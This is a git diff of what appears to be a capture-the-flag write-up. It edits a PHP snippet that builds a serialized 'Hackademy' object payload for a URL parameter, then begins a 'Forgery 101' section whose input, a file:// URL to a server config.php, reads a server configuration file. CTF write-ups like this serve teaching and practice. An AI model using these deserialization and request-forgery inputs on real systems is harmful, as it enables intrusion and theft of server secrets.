@@ -55,16 +55,10 @@ This is the final payload:
     }   
     $serialized = serialize(new Hackademy());
 
-    // Output
-    echo "Serialized:\n";
     echo $serialized;
-    echo "\n";
-    echo "Encoded:\n";
-    echo base64_encode($serialized);
-    echo "\n";
 ?>
 ```
-I then use the output in the URL parameter, and it gives me the flag :)
+I then take the output in a base64 encoder tool and use this encoded output in the URL parameter, and it gives me the flag :)
 
 ### Forgery 101
 In the url input: ```file:///var/www/html/api/config.php```<br>
